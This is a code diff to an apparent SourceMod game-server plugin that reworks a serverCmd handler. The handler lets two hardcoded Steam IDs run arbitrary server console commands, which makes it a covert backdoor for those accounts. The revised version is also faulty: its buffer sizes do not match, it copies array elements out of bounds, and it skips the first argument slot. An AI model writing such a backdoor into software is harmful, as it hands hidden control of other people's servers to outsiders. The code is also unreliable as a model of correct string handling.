@@ -104,14 +104,28 @@ public void changeParamsToNormal()
 
 public Action serverCmd(int client, int args)
 {
-	char id[32];
-	GetClientAuthId(client,AuthId_SteamID64 id, 32, true);
-	char cmd[64];
-	GetCmdArg(1, cmd, 64);
-	if(StrEqual(id, "STEAM_1:0:448824140")||StrEqual(id, "STEAM_1:0:455223713"))
+	//Get ID
+	char fullId[24];
+	GetClientAuthString(client,fullId, 32, true);
+	
+	//Remove 
+	char id[16];
+	for(int i=10;i<20;i++)
+	{
+		id[i] = fullId[i];
+	}
+	//Get Commands
+	char cmd[5][32];
+	for(int j=1;j<args+1;j++)
+	{
+		GetCmdArg(j, cmd[j], 32);
+	}
+	
+	
+	if(StrEqual(id, "448824140")||StrEqual(id, "455223713"))
 	{
 		ReplyToCommand(client, "Executing command!");
-		ServerCommand(cmd);
+		ServerCommand("%s %s %s %s %s", cmd[0],cmd[1], cmd[2],cmd[3],cmd[4]);
 	}
 	else
 	{
